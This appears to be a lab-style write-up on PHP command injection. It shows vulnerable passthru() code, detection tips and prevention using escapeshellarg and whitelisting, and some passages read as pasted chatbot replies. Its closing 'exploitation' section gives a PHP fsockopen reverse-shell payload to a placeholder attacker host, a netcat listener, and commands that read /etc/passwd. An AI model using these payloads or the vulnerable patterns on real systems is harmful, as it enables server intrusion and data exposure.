Command injection occurs when web applications execute system commands using unsanitized user input, enabling attackers to run arbitrary OS commands.

  The provided example involves a PHP script using the passthru() function to run the cowsay command with user-controlled parameters, illustrating a security flaw.

Attackers can exploit inline bash commands $(your_command) within input fields to execute malicious commands on the server.

Common commands used in exploits include whoami, id, ifconfig/ip addr, uname -a, and ps -ef, which help attackers gather system information.

Successful exploitation allows attackers to enumerate files, identify users, and gain information about the server environment, potentially escalating their access.

Proper input validation, parameter sanitization, and avoiding direct command execution with user input are critical to prevent command injection.

The scenario encourages exploiting the vulnerability to answer several security questions related to system configuration, user accounts, and installed software.
example of the code is

```bash
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];           // Get the value of the "mooing" parameter from the URL query string
        $cow = 'default';                    // Set a default cow figure
        
        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];             // If the "cow" parameter is provided, use its value instead
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");  // Run a Perl program (cowsay) that displays the message with the specified cow figure
    }
?>
```
ALSO THERE IS ONTHER EXAMPLE OF THE CODE:
```bash
<?php
if (isset($_GET['commandString'])) {
    $command_string = $_GET['commandString'];

    try {
        passthru($command_string);
    } catch (Error $error) {
        echo "<p class=mt-3><b>$error</b></p>";
    }
}
?>
```
Line-by-Line Breakdown
`if (isset($_GET['commandString'])) {`:
Checks if a parameter called `commandString` was passed via the URL query string.

`$command_string = $_GET['commandString'];`:
Stores the value of that parameter in the variable `$command_string`.

`try { passthru($command_string); }`:
Attempts to execute the command using `passthru()`, which runs the command and outputs the result directly.

`catch (Error $error) { ... }`:
If an error occurs during execution (like an invalid command or PHP runtime error), it is caught and printed inside a paragraph.

How to detect:

To detect command injection vulnerabilities like in your PHP example, here are practical steps and signs to look for:

How to Detect Command Injection Vulnerabilities

Understand the code context

Look for places where user input `($_GET, $_POST, etc.)` is used directly in functions that execute system commands, like `passthru(), exec(), shell_exec(), system(), or backticks` (`command`).

Try injecting special shell characters via inputs

Test the URL or form fields by adding characters that can break out of the intended command argument, such as:
`
; (semicolon)
&&
| (pipe)
$(), ` (backticks), or other command substitution syntax
`
For example, if the parameter was mooing, try something like:

`CODE_BLOCK_0
or
CODE_BLOCK_1
`
If the output includes results from commands like `ls, whoami`, or other unexpected outputs, the app is likely vulnerable.

2.Check application responses:

If injecting shell meta-characters changes the output or causes errors revealing command output, that indicates vulnerability.

Sometimes error messages or unusual behavior after injection attempts hint at command injection.

Review server logs:

Look for suspicious requests with injected commands or unexpected parameters.

Use automated security tools

Tools like OWASP ZAP, Burp Suite, or command injection-specific scanners can automate testing for command injection.

Static code analysis

Use code analysis tools or manually review source code for dangerous patterns such as:

User input passed directly to `passthru(), exec(), system(), etc`.

Missing input validation or escaping before running shell commands

Summary: To detect injection for the PHP code you shared:

Try to modify the mooing or cow parameters by appending shell commands using characters like `; or &&`.

Observe if the output shows the effect of injected commands.

Check if the application behavior changes or errors out in suspicious ways.

If you want, I can help you draft specific test inputs for detection or explain how to fix the vulnerability. Would you like that?

-Prevention:

Preventing command injection in PHP code like yours is crucial for security. Here are effective ways to prevent command injection in your script:

How to Prevent Command Injection in Your PHP Code

Avoid directly passing user input to shell commands

Wherever possible, do not use functions like ``passthru(), exec(), system()`` with raw user input.

Validate and sanitize inputs strictly

Whitelist allowed values for parameters like cow. For example, prepare a list of allowed cow files and reject anything not in that list.

For text messages (mooing), restrict or sanitize input to remove shell-special characters.

Use `escapeshellarg` or `escapeshellcmd`

Use `escapeshellarg()` to escape parameters that will be passed to the shell, which safely wraps them in quotes and escapes special characters.
Example:
```
php
$mooing = escapeshellarg($_GET["mooing"]);
$cow = escapeshellarg($cow);
passthru("perl /usr/bin/cowsay -f $cow $mooing");
```
However, be careful if $cow is restricted to specific filenames because escapeshellarg will quote the whole string (which might break the `-f` option if not handled properly).

-Use safer alternatives:

Instead of running commands directly, consider using a PHP library or internal logic to do what you want without shell calls.

Or run shell commands in a way that doesn’t allow arbitrary input, for example by:

Restricting $cow to a predefined set (whitelist)

Encoding or sanitizing $mooing

Example of whitelisting cow types:

```
php
$allowed_cows = ['default', 'dragon', 'tux', 'ghostbusters']; // allowed cows
$cow = 'default';

if (isset($_GET['cow']) && in_array($_GET['cow'], $allowed_cows)) {
    $cow = $_GET['cow'];
}

$mooing = escapeshellarg($_GET['mooing']);
passthru("perl /usr/bin/cowsay -f $cow $mooing");
```
Disable dangerous PHP functions (optional)

If possible, disable dangerous functions like `exec, passthru` in your PHP configuration, especially if they aren’t needed.

This is a broader measure but improves overall security.

-Summary:

Never trust user input directly in shell commands.

Whitelist allowed values for known parameters.

Use escapeshellarg() to safely escape arguments.

Validate and sanitize every input rigorously.

Prefer safer ways without shell execution when possible.

If you want, I can help you improve your original code with these protections implemented. Would you like me to?

here are some other commands you may want to try to test for command injection on the web application:



```bash
whoami
id
ifconfig/ip addr
uname -a
ps -ef
```
EXPLOITATION TIME:

First is to create a reverse shell on the terminal for command execution in that case I shall use a cheat sheet i.e [cheat-sheet](swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#ruby)

where we paste this ```$(php -r '$sock=fsockopen("attacker_ip",port_NO);exec("/bin/sh -i <&3 >&3 2>&3");')``` ,also this command may work ```php -r '$sock=fsockopen("attacker_ip",port_NO);exec("/bin/sh -i <&3 >&3 2>&3");'```

on the command prompt on the web while we listen using nc port listener in order to access the shell.

After having an interactive shell we can then run several commands that is:

```bash
whoami  # shows the user

ls  #shows the available files and directories on that user

cat /etc/passwd  # shows the available users and there privileges

cat /etc/os-release  # shows the os version running on the web server
```





















































